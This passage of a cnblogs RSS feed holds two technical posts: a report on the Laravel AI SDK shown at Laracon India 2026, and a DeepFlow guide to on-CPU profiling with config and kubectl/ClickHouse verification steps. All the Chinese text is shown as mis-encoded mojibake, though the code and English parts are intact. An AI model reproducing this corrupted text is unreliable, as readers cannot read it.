éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19567203);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19567203', targetLink: 'https://www.cnblogs.com/weipo0105/p/19567203', title: 'Macä¸äº«ï¼åé¥­çº§æç¨ï¼æææå¸¦ä½ ç¨MiniMax 2.1ä¸Discordé¨ç½²ä¸ªäººAIå©æOpenClaw' })">ä¸¾æ¥</a>
</div>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Laravel AI SDK å¨ Laracon India 2026 é¦æ¬¡äº®ç¸ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19567163</link>
    <guid>772e1ec798fdebb17bee3b5a34399dc8</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19567163" title="åå¸äº 2026-02-03 07:40">
    <span role="heading" aria-level="2">Laravel AI SDK å¨ Laracon India 2026 é¦æ¬¡äº®ç¸</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="laravel-ai-sdk-å¨-laracon-india-2026-é¦æ¬¡äº®ç¸">Laravel AI SDK å¨ Laracon India 2026 é¦æ¬¡äº®ç¸</h1>
<p>2026 å¹´ 1 æ 31 æ¥ï¼Taylor Otwell å¨ Laracon India 2026 ä¸é¦æ¬¡å¬å¼å±ç¤ºäº Laravel AI SDKãè¿å¥ä»å·²å¼åæ°æçå¨æ°å·¥å·éï¼ææå½»åºæ¹å Laravel åºç¨ä¸­ç AI éææ¹å¼ã</p>
<h2 id="ä»ä¹æ¯-laravel-ai-sdk">ä»ä¹æ¯ Laravel AI SDKï¼</h2>
<p>Laravel AI SDK æ¨å¨å¤§å¹ç®åä¸åç±» AI æå¡åçäº¤äºï¼æ¯æä»¥ä¸æä½ï¼</p>
<ul>
<li>è·åç±»ä¼¼ ChatGPT çèå¤©æºå¨äººååº</li>
<li>éè¿ embeddings å®ç°æ°æ®åºè¯­ä¹æç´¢</li>
<li>çæè§é¢ãé³é¢åè½¬å½ææ¬</li>
<li>ä»¥åæ´å¤åè½</li>
</ul>
<p>Taylor Otwell çç®æ æ¯æä¾ä¼éç Laravel è¯­æ³åç®æ´ç APIï¼æ è®ºä½ éæ©åªä¸ª AI æå¡åãå®éä½¿ç¨æ¶ï¼åªéè°ç¨ <code>agent()-&gt;prompt('ä½ çè¯·æ±...')</code> å³å¯è·å¾ç»æã</p>
<h2 id="éç½®-ai-æå¡å">éç½® AI æå¡å</h2>
<p>éç½®è¿ç¨éå¸¸ç®åãå¨ <code>config/ai.php</code> æä»¶ä¸­ï¼ä½ å¯ä»¥ä¸ºä¸åçæå¡åéç½® API å¯é¥ï¼å¦ AnthropicãOpenAIãCohereãElevenLabs æ Geminiã</p>
<p>SDK è¿åè®¸æ ¹æ®æä½ç±»åè®¾ç½®é»è®¤æå¡åï¼</p>
<ul>
<li><code>default</code> â openai</li>
<li><code>default_for_images</code> â gemini</li>
<li><code>default_for_audio</code> â openai</li>
<li><code>default_for_transcription</code> â openai</li>
<li><code>default_for_embeddings</code> â openai</li>
<li><code>default_for_reranking</code> â cohere</li>
</ul>
<h2 id="åºç¡ç¨æ³è°ç¨-agent">åºç¡ç¨æ³ï¼è°ç¨ Agent</h2>
<p>æç®åçç¤ºä¾å±ç¤ºäºè¿ç§æç®æ¹å¼çå¼ºå¤§ï¼</p>
<pre><code class="language-php">Route::get('/agent', function () {
    $response = agent(
        instructions: 'You are a helpful assistant.'
    )-&gt;prompt('Tell me about Laravel in one sentence.');
});
</code></pre>
<p>ååºè¿ååå«è°ç¨åæ°æ®çå®æ´ç»æï¼åæ¬ä½¿ç¨ç token æ°ãæå¡åãæ¨¡åï¼å½ç¶è¿æååºåå®¹ã</p>
<h2 id="jsonschema-èªå®ä¹æ°æ®ç»æ">JsonSchema èªå®ä¹æ°æ®ç»æ</h2>
<p>ä½ å¯ä»¥éè¿æä¾ JSON Schema ç²¾ç¡®å®ä¹è¿åç»æçæ ¼å¼ãè¿è®©ä½ è½å¤è·å¾å¯ç´æ¥å¨åºç¨ä¸­ä½¿ç¨çç»æåæ°æ®ã</p>
<h2 id="éåå¤çä¸æµå¼ååº">éåå¤çä¸æµå¼ååº</h2>
<p>ç±äº LLM ååºå¯è½éè¦ä¸äºæ¶é´ï¼SDK æä¾äºä¸¤ç§ä¼éçéé¡¹ï¼</p>
<ul>
<li><strong>éåå¤ç</strong>ï¼å°è¯·æ±å§æç» Laravel Job</li>
<li><strong>æµå¼ååº</strong>ï¼éå­æ¾ç¤ºååºï¼å°±åä¼ ç»èå¤©æºå¨äººä¸æ ·</li>
</ul>
<p>è¿ç§çµæ´»æ§ä¸ç°æç Laravel çæç³»ç»å®ç¾éæã</p>
<h2 id="å¾åçæ">å¾åçæ</h2>
<p>Laravel çãå¼ç®±å³ç¨ãçå¿µå¨è¿éä½ç°å¾æ·æ¼å°½è´ãä½ å¯ä»¥å° AI SDK çæ°åè½ä¸ Laravel ç°æåè½ï¼å¦éååæä»¶ç³»ç»ï¼ç»åä½¿ç¨ã</p>
<p>çæå¾ååå¾å¦æ­¤ç®åï¼</p>
<pre><code class="language-php">agent()-&gt;generateImage('prompt here')-&gt;store('path');
</code></pre>
<p>ä½ çè³å¯ä»¥éè¿æ·»å æ°ç AI æç¤ºè¯æ¥ä¿®æ¹ç°æå¾åã</p>
<h2 id="é³é¢ä¸è½¬å½">é³é¢ä¸è½¬å½</h2>
<p>ä¸å¾åç±»ä¼¼ï¼SDK åè®¸éè¿ ElevenLabs ç­æå¡åå¤çé³é¢ï¼æ è®ºæ¯çæé³é¢è¿æ¯è½¬å½ç°æåå®¹ã</p>
<h2 id="embeddings-ä¸è¯­ä¹æç´¢">Embeddings ä¸è¯­ä¹æç´¢</h2>
<p>æä»¤äººå°è±¡æ·±å»çåè½ä¹ä¸æ¯å¨é¡¹ç®ä¸­å®ç°è¯­ä¹æç´¢çä¾¿æ·æ§ã</p>
<p>ä¾å¦ï¼æç´¢ "big boats" å¯ä»¥æ¾å°çµå½± "Titanic"ï¼å³ä½¿å¶æè¿°ä¸­æ²¡æåå« "boat" è¿ä¸ªè¯ãè¿å°±æ¯ embeddings çé­åã</p>
<p>è½ç¶åºå±å®ç°å¤æï¼ä½æ§å¶å¨ç«¯çä»£ç ä¾ç¶ç®æ´ä¼éãè¿ä¸ªåè½éå PostgreSQL æææä½³ï¼å ä¸º PostgreSQL å·æåçåéæç´¢åè½ï¼å·²å¨ Laravel 12 ä¸­æ°å¢æ¯æã</p>
<h2 id="agent-ç±»">Agent ç±»</h2>
<p>SDK å°æ¯æéè¿å½ä»¤çæä¸ç¨ç Agent ç±»ï¼</p>
<pre><code class="language-shell">php artisan make:agent
</code></pre>
<p>è¿äºç±»æä¾äºä¸°å¯çéç½®éé¡¹ï¼æ¯å¦ <code>UseCheapestModel</code> å±æ§å¯ä»¥èªå¨éæ©åæå¡åæç»æµçæ¨¡åï¼haikuãnano ç­ï¼ã</p>
<p>Taylor è¿å±ç¤ºäºå¶ä»å¯éç½®çåè½ï¼</p>
<ul>
<li>Middleware</li>
<li>èªå®ä¹éç½®</li>
<li>æ°æ®ç»æ</li>
<li>å¸¦ Schema çå·¥å·</li>
<li>ç½é¡µæç´¢</li>
</ul>
<h2 id="åå¸è®¡å">åå¸è®¡å</h2>
<p>Laravel AI SDK è®¡åäºæ¬å¨åæ­£å¼åå¸ãè¿å¥å¨æ°å·¥å·éææè®© Laravel åºç¨ä¸­ç AI éæåå¾åæ¡æ¶çå¶ä»é¨åä¸æ ·ç®åä¼éã</p>
<p>è¿æ¬¡æ¼ç¤ºåæ¬¡è¯æäº Laravel çæç³»ç»éåºæ°ææ¯çè½åï¼åæ¶ä¿æå¶æ ¸å¿çå¿µï¼è®© Web å¼ååå¾æå¿«ä¸é«æï¼</p>
<p><a href="https://catchadmin.com/post/2026-02/laravel-ai-sdk" target="_blank" rel="noopener nofollow">Laravel AI SDK å¨ Laracon India 2026 é¦æ¬¡äº®ç¸</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 07:40">2026-02-03 07:40</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">17</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19567163);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19567163', targetLink: 'https://www.cnblogs.com/catchadmin/p/19567163', title: 'Laravel AI SDK å¨ Laracon India 2026 é¦æ¬¡äº®ç¸' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ éè¿ DeepFlow æ¥è¯¢å½æ°å¨ CPU ä¸æ¶èçæ¶é´ï¼CPU æ§è½åæï¼ ]]></title>
    <link>https://www.cnblogs.com/manuscript/p/19565142</link>
    <guid>b943aefa71f4a502197cbf4c84e4d921</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/manuscript/p/19565142" title="åå¸äº 2026-02-03 05:07">
    <span role="heading" aria-level="2">éè¿ DeepFlow æ¥è¯¢å½æ°å¨ CPU ä¸æ¶èçæ¶é´ï¼CPU æ§è½åæï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åè¨">åè¨</h1>
<p>æ¬æä¸»è¦ä»ç» DeepFlow ç AutoProfilingï¼on-cpuï¼æç»­æ§è½åæåè½çéç½®ä¸ä½¿ç¨ãè¯¥è½åä¸ DeepFlow çé¨ç½²æ¹å¼æ å³ãèª v6.6.3 èµ·ï¼deepflow-agent çéç½®æ ¼å¼æè¾å¤§è°æ´ï¼æ¬æä½¿ç¨æ°çæ¬éç½®æ ¼å¼ï¼å»ºè®®ä½¿ç¨ v7.0 LTS æåç»­ LTS çæ¬ã</p>
<h1 id="cpu-åæçéç½®ä¸åºç¨">CPU åæçéç½®ä¸åºç¨</h1>
<h2 id="åç½®æ¡ä»¶">åç½®æ¡ä»¶</h2>
<p>éè¦åæ ¸çæ¬æ¯æ eBPF è½åï¼DeepFlow ä¸­å¼å¯ eBPF è½åï¼é»è®¤å¼å¯ï¼æéåæ ¸çæ¬è¦æ±å¦ä¸ï¼</p>
<table>
<thead>
<tr>
<th>ä½ç³»æ¶æ</th>
<th>åè¡ç</th>
<th>åæ ¸çæ¬</th>
<th>kprobe [1]</th>
<th>Golang uprobe</th>
<th>OpenSSL uprobe</th>
<th>perf</th>
</tr>
</thead>
<tbody>
<tr>
<td>X86</td>
<td>CentOS 7.9</td>
<td>3.10.0-940+ <strong>[2]</strong></td>
<td>Y</td>
<td>Y <strong>[3]</strong></td>
<td>Y <strong>[3]</strong></td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>RedHat 7.6</td>
<td>3.10.0-940+ <strong>[2]</strong></td>
<td>Y</td>
<td>Y <strong>[3]</strong></td>
<td>Y <strong>[3]</strong></td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>*</td>
<td>4.14 <strong>[4]</strong></td>
<td>Y</td>
<td>Y <strong>[3]</strong></td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>*</td>
<td>4.15</td>
<td>Y</td>
<td>Y <strong>[3]</strong></td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>*</td>
<td>4.16</td>
<td>Y</td>
<td>Y</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>*</td>
<td>4.17+</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>SUSE 12 SP5</td>
<td>4.12 [5]</td>
<td>Y</td>
<td>Y</td>
<td>-</td>
<td>Y</td>
</tr>
<tr>
<td>ARM</td>
<td>CentOS 8</td>
<td>4.18</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>EulerOS</td>
<td>5.10+</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>éºéº KylinOS V10 SP1</td>
<td>4.19.90-23 [6]</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>éºéº KylinOS V10 SP2</td>
<td>4.19.90-25.24+ [7]</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>éºéº KylinOS V10 SP3</td>
<td>4.19.90-52.24+</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td>å¶ä»åè¡ç</td>
<td>5.8+</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
</tbody>
</table>
<p>å¯¹åæ ¸çæ¬çè¡¥åè¯´æï¼</p>
<ul>
<li>[1]ï¼å¨ Linux å¯ç¨äº BTFï¼BPF Type Formatï¼çæåµä¸ï¼X86 æ¶æåæ ¸çæ¬å¤§äºç­äº <a href="https://github.com/torvalds/linux/commit/f1b9509c2fb0ef4db8d22dac9aef8e856a5d81f6" target="_blank" rel="noopener nofollow">5.5</a>ãARM æ¶æåæ ¸çæ¬å¤§äºç­äº <a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?h=linux-6.0.y&amp;id=efc9909fdce00a827a37609628223cd45bf95d0b" target="_blank" rel="noopener nofollow">6.0</a> æ¶ï¼agent å°èªå¨ä½¿ç¨ fentry/fexit æ¿ä»£ kprobe/kretprobeï¼å¯è·å¾çº¦ 15% çæ§è½æåã</li>
<li>[2]ï¼CentOS 7.9ãRedHat 7.6 å 3.10 åæ ¸ä¸­<a href="https://www.redhat.com/en/blog/introduction-ebpf-red-hat-enterprise-linux-7" target="_blank" rel="noopener nofollow">ç§»æ¤äºä¸é¨å eBPF è½å</a>ã
<ul>
<li>å¨è¿ä¸¤ä¸ªåè¡çä¸­ï¼DeepFlow æ¯æçè¯¦ç»åæ ¸çæ¬å¦ä¸ï¼<a href="https://github.com/deepflowio/deepflow/blob/main/agent/src/ebpf/docs/probes-and-maps.md" target="_blank" rel="noopener nofollow">ä¾èµç Hook ç¹</a>ï¼ï¼
<ul>
<li>3.10.0-957.el7.x86_64</li>
<li>3.10.0-1062.el7.x86_64</li>
<li>3.10.0-1127.el7.x86_64</li>
<li>3.10.0-1160.el7.x86_64</li>
</ul>
</li>
<li>æ³¨æ RedHat çå£°æï¼
<blockquote>
<p>The eBPF in Red Hat Enterprise Linux 7.6 is provided as Tech Preview and thus doesn't come with full support and is not suitable for deployment in production. It is provided with the primary goal to gain wider exposure, and potentially move to full support in the future. eBPF in Red Hat Enterprise Linux 7.6 is enabled only for tracing purposes, which allows attaching eBPF programs to probes, tracepoints and perf events.</p>
</blockquote>
</li>
</ul>
</li>
<li>[3]ï¼å®¹å¨åç Golang/OpenSSL è¿ç¨ä¸æ¯æã</li>
<li>[4]ï¼å¨åæ ¸ 4.14 ä¸­ï¼ä¸ä¸ª tracepoint ä¸è½è¢«å¤ä¸ª eBPF program attachï¼ä¾å¦ä¸è½åæ¶è¿è¡ä¸¤ä¸ªæå¤ä¸ª deepflow-agentï¼ãå¶ä»çæ¬ä¸å­å¨è¯¥é®é¢ã</li>
<li>[5]ï¼ç®åæ¯æ SUSE 12 SP5 4.12.14ï¼ä½ Linux ç¤¾åºç 4.12 çæ¬ä¾ç¶ä¸æ¯æã</li>
<li>[6]ï¼KylinOS V10 SP1 é¨ååæ ¸ï¼ä¾å¦ 4.19.90-23.48.v2101.ky10.aarch64ï¼å¯æ­£å¸¸è¿è¡ï¼ä½ä¸ç¡®ä¿ KylinOS V10 SP1 ææ aarch64 æ¶æåæ ¸é½è½æ­£å¸¸è¿è¡ deepflow-agentã</li>
<li>[7]ï¼KylinOS V10 SP2 æäºåæ ¸ï¼å¦ 4.19.90-24.4.v2101.ky10.aarch64ï¼ç±äºä¸æ¯æ <code>bpf_probe_read_user()</code>ï¼æ æ³è¯»åç¨æ·ææ°æ®ï¼å æ­¤ä¸æ¯æ AutoTracingï¼ä½æ¯ææç»­åæåæä»¶è¯»åè¿½è¸ªåè½ã</li>
</ul>
<h2 id="æ¯æè¯­è¨">æ¯æè¯­è¨</h2>
<table>
<thead>
<tr>
<th>ç±»å</th>
<th>æ¯æè¯­è¨/åº</th>
<th>ç¤¾åºç</th>
<th>ä¼ä¸ç</th>
</tr>
</thead>
<tbody>
<tr>
<td>on-cpu</td>
<td>Java</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>C/C++</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Rust</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Golang</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Python <code>***</code></td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>CUDA</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Lua <code>*</code></td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>off-cpu</td>
<td>Java</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>C/C++</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Rust</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Golang</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Python <code>***</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>CUDA</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Lua <code>*</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>on-gpu</td>
<td>CUDA <code>*</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>mem-alloc</td>
<td>Java <code>**</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Rust</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Golang <code>*</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td></td>
<td>Python <code>*</code> <code>***</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>mem-inuse</td>
<td>Rust</td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>hbm-alloc</td>
<td>CUDA <code>*</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>hbm-inuse</td>
<td>CUDA <code>*</code></td>
<td></td>
<td>â</td>
</tr>
<tr>
<td>rdma</td>
<td>C/C++ <code>*</code></td>
<td></td>
<td>â</td>
</tr>
</tbody>
</table>
<p>è¯´æï¼</p>
<ul>
<li><code>*</code>ï¼å¼åä¸­çåè½ï¼å°æªæ­£å¼åå¸ï¼</li>
<li><code>**</code>ï¼è¿è¡ Java ç¨åºç JVM å¿é¡»åå«ç¬¦å·è¡¨ï¼åèä¸æç JVM ç¬¦å·è¡¨æ£æ¥</li>
<li><code>***</code>ï¼å½åæ¯æçæ¬ä¸º Python 3.10</li>
<li>è¯­è¨åç±»ï¼
<ul>
<li>ç¼è¯ä¸º ELF æ ¼å¼å¯æ§è¡æä»¶çè¯­è¨ï¼GolangãRustãC/C++</li>
<li>ä½¿ç¨ JVM èææºçè¯­è¨ï¼Java</li>
<li>è§£éåè¯­è¨ï¼Python</li>
</ul>
</li>
</ul>
<p>è·å Profiling æ°æ®éæ»¡è¶³ä¸¤ä¸ªåææ¡ä»¶ï¼</p>
<ul>
<li>åºç¨è¿ç¨éè¦å¼å¯ Frame Pointerï¼æå¯ç¨ Agent ç DWARF æ åæº¯è½å
<ul>
<li>åºç¨è¿ç¨å¼å¯ Frame Pointerï¼å¸§æéå¯å­å¨ï¼ï¼
<ul>
<li>ç¼è¯ C/C++ï¼<code>gcc -fno-omit-frame-pointer</code></li>
<li>ç¼è¯ Rustï¼<code>RUSTFLAGS="-C force-frame-pointers=yes"</code></li>
<li>ç¼è¯ Golangï¼é»è®¤å¼å¯ï¼æ éé¢å¤ç¼è¯åæ°</li>
<li>è¿è¡ Javaï¼<code>-XX:+PreserveFramePointer</code>
<ul>
<li>å¼å¯è¯¥åæ°ä¼ç¦ç¨æäºç¼è¯å¨ä¼åï¼ä¸è¿æ ¹æ® <a href="https://netflixtechblog.com/java-in-flames-e763b3d32166" target="_blank" rel="noopener nofollow">Netflix</a> å <a href="https://www.brendangregg.com/FlameGraphs/cpuflamegraphs.html" target="_blank" rel="noopener nofollow">Brendan Gregg</a> çå®æµç»æï¼éå¸¸åªä¼å¼å¥ &lt;1% çæ§è½æèãNetflix æ©å¨ 2015 å¹´èµ·å·²å¨çäº§ç¯å¢å¤§è§æ¨¡ä½¿ç¨ï¼ä»¥æ¯æå¶ Java ç¨åºçæ¥å¸¸æ§è½åæã</li>
</ul>
</li>
</ul>
</li>
<li>å¯ç¨ Agent ç DWARF æ åæº¯è½åè¯·åè<a href="https://www.deepflow.io/docs/zh/configuration/agent/#inputs.ebpf.profile.unwinding" target="_blank" rel="noopener nofollow">ææ¡£</a></li>
</ul>
</li>
<li>å¯¹äºç¼è¯åè¯­è¨çåºç¨è¿ç¨ï¼ç¼è¯æ¶éè¦æ³¨æä¿çç¬¦å·è¡¨</li>
</ul>
<h3 id="jvm-ç¬¦å·è¡¨æ£æ¥">JVM ç¬¦å·è¡¨æ£æ¥</h3>
<pre><code class="language-bash"># 1) æ¥æ¾éè¦è¿è¡åå­åæç Java è¿ç¨å·ï¼è®°ä¸º $pid

# 2) æ¥çè¿ç¨å è½½ç libjvm.so æå¨ä½ç½®ï¼è®°ä¸º $path
grep libjvm.so /proc/$pid/maps

# 3) æ£æ¥è¯¥æä»¶æ¯å¦åå«ç¬¦å·è¡¨
readelf -WS $path | grep symtab
</code></pre>
<h2 id="éç½®æ¹å¼">éç½®æ¹å¼</h2>
<p>éç½®åéè¦æ³¨æï¼<a href="https://github.com/deepflowio/deepflow/blob/main/agent/config/deepflow-agent.yaml" title="deepflow-agent" target="_blank" rel="noopener nofollow">deepflow-agent</a> ç ConfigMap ä»ç¨äº agent å server æ³¨åï¼èä¸æ¹ç agent èªèº«éç½®éè¦éè¿ <a href="https://www.deepflow.io/docs/zh/best-practice/agent-advanced-config/" title="deepflow-ctl" target="_blank" rel="noopener nofollow">deepflow-ctl</a> ä¸åã</p>
<blockquote>
<p>æ³¨ï¼CPU åæè¿æä¸äºæªåºç°å¨ä¸æ¹ç¤ºä¾ä¸­çåæ°ãå¦æä½ ä¸ç¡®å®ä¿®æ¹åä¼äº§çä»ä¹å½±åï¼å»ºè®®ä¿æé»è®¤å¼ã</p>
</blockquote>
<pre><code class="language-yaml">inputs:
  proc:
    enabled: true
    process_matcher:
      # åè½åè¡¨ï¼é»è®¤å¼å³åèé¾æ¥ä¸­çè¯¦ç»æè¿°ï¼
      # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher.enabled_features
      - enabled_features:
          - ebpf.profile.on_cpu
          - proc.gprocess_info
        # Rust æ­£åè§åï¼
        # https://regex101.com/
        match_regex: \bjava( +\S+)* +-jar +(\S*/)*([^ /]+\.jar)
        # å¹éå½¢å¼ï¼åèè¯¦ç»æè¿°ï¼
        # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher
        match_type: cmdline_with_args
        # æ¯å¦ä»å¹éå®¹å¨åçè¿ç¨ï¼
        # https://www.deepflow.io/docs/zh/configuration/agent/#inputs.proc.process_matcher.only_in_container
        only_in_container: false
        # å°å¹éå°çç¬¬ä¸æ®µ ([^ /]+\.jar) åå®¹ä½ä¸ºåç§°ï¼ä¸è¬ä¸º jar ååï¼
        # ä¾å¦ï¼shop-web-0.0.1-SNAPSHOT.jar
        rewrite_name: $3
      - enabled_features:
          - ebpf.profile.on_cpu
          - proc.gprocess_info
          - proc.socket_list
        match_regex: ^(cartservice|checkoutservice|shippingservice|coredns|mysqld|deepflow-server|deepflow-agent|stress-ng|cpu-demo)
        only_in_container: false
</code></pre>
<h2 id="æ ¡éªç»æ">æ ¡éªç»æ</h2>
<ol>
<li>
<p>æ¥çå½åç Java Demo PID</p>
<pre><code class="language-bash">root@ce-demo-1:~# kubectl get pods -n deepflow-otel-spring-demo web-shop-7c48fd68dc-szchh -o wide
NAME                        READY   STATUS    RESTARTS   AGE   IP               NODE        NOMINATED NODE   READINESS GATES
web-shop-7c48fd68dc-szchh   1/1     Running   0          83d   10.244.228.165   ce-demo-2   &lt;none&gt;           &lt;none&gt;

root@ce-demo-1:~# kubectl exec -n deepflow-otel-spring-demo web-shop-7c48fd68dc-szchh -c web-shop -- ps aux
PID   USER     TIME  COMMAND
  1   root     0:00  sh /home/docker-entrypoint.sh -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar
  7   root     1d13  java -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar

root@ce-demo-1:~# ssh ce-demo-2 'ps aux | grep shop-web-0.0.1-SNAPSHOT.jar'
root     2684642  2.0  2.4 8348252 406656 ?      Sl    2025 2430:21 java -javaagent:/sidecar/agent/opentelemetry-javaagent.jar -Dotel.resource.attributes=service.name=shop-web -Dotel.traces.exporter=otlp -Dotel.metrics.exporter=none -jar /home/shop-web-0.0.1-SNAPSHOT.jar
</code></pre>
</li>
<li>
<p>å¨ ClickHouse ä¸­éè¿ä¸ä¸æ­¥ç PID æ¥è¯¢ DeepFlow æ ç­¾ä¿¡æ¯</p>
<pre><code class="language-sql">root@ce-demo-1:~# kubectl exec -it -n deepflow deepflow-clickhouse-0 -c clickhouse -- bash
root@deepflow-clickhouse-0:/# clickhouse client
ClickHouse client version 23.10.4.25 (official build).
Connecting to localhost:9000 as user default.
Connected to ClickHouse server version 23.10.4 revision 54466.

deepflow-clickhouse-0.deepflow-clickhouse-headless.deepflow.svc.cluster.local :)

-- éè¿ PID æ¥è¯¢å¯¹åºè¿ç¨å¨ DeepFlow ä¸­ç tag ä¿¡æ¯
SELECT gprocess_id, app_service
FROM `profile`.`in_process`
WHERE process_id = 2684642
LIMIT 1;

ââgprocess_idââ¬âapp_serviceââ
â         123 â java        â
âââââââââââââââ´ââââââââââââââ

-- éè¿ gprocess_id æ¥è¯¢ rewrite_name æ¯å¦çæ
SELECT *
FROM `flow_tag`.`gprocess_map`
WHERE id = 123
LIMIT 1;

âââidââ¬ânameâââââââââââââââââââââââââ¬âicon_idââ¬âchost_idââ¬âl3_epc_idââ¬âteam_idââ¬âdomain_idââ¬âsub_domain_idââ
â 123 â shop-web-0.0.1-SNAPSHOT.jar â       0 â        2 â         1 â       1 â         1 â             0 â
âââââââ´ââââââââââââââââââââââââââââââ´ââââââââââ´âââââââââââ´ââââââââââââ´ââââââââââ´ââââââââââââ´ââââââââââââââââ
</code></pre>
</li>
<li>
<p>æ¥ç Continuous Profiling Dashboard ä¸­å¯¹åº Demo çåæææ</p>
<p><img src="https://img2024.cnblogs.com/blog/3735354/202602/3735354-20260202154119936-1275480608.png" alt="img_v3_02uh_57e28e17-0461-40f0-80ff-04c08ff61a2g" loading="lazy"></p>
<p>å­æ®µè¯´æï¼</p>
<ul>
<li>auto_serviceï¼ä¸¾ä¾è¯´æï¼ç®åä¸å¡é¨ç½²æ¹å¼ä¸º Deploymentï¼æ­¤å¤ä¾æ® k8s svc name &gt; deployment name å¡«å</li>
</ul>
</li>
<li>
<p>å½æ°ç±»åå¯¹åºå³ç³»</p>
<table>
<thead>
<tr>
<th>Function Type</th>
<th>å«ä¹</th>
<th>Profile Event Type</th>
<th>ç¹å¾</th>
</tr>
</thead>
<tbody>
<tr>
<td>O</td>
<td>å¯¹è±¡ç±»å</td>
<td><code>mem-*</code></td>
<td>Memory Profile çå¶å­èç¹</td>
</tr>
<tr>
<td>H</td>
<td>äºä¸»æº</td>
<td><code>*</code></td>
<td>ç­äº <code>Total</code> çæ ¹èç¹</td>
</tr>
<tr>
<td>P</td>
<td>è¿ç¨</td>
<td><code>*</code></td>
<td>ä»¥ <code>[p]</code> å¼å¤´ï¼ä¸ä¸ç­äº <code>Total</code> çæ ¹èç¹</td>
</tr>
<tr>
<td>T</td>
<td>çº¿ç¨</td>
<td><code>*</code></td>
<td>ä»¥ <code>[t]</code> å¼å¤´</td>
</tr>
<tr>
<td>K</td>
<td>åæ ¸å½æ°</td>
<td><code>*</code></td>
<td>ä»¥ <code>[k]</code> å¼å¤´</td>
</tr>
<tr>
<td>C</td>
<td>CUDA é©±å¨å½æ°</td>
<td><code>*</code></td>
<td>ä»¥ <code>[c]</code> å¼å¤´</td>
</tr>
<tr>
<td>L</td>
<td>å¨æé¾æ¥åºå½æ°</td>
<td><code>*</code></td>
<td>ä»¥ <code>[l]</code> å¼å¤´</td>
</tr>
<tr>
<td>?</td>
<td>æªç¥å½æ°</td>
<td><code>*</code></td>
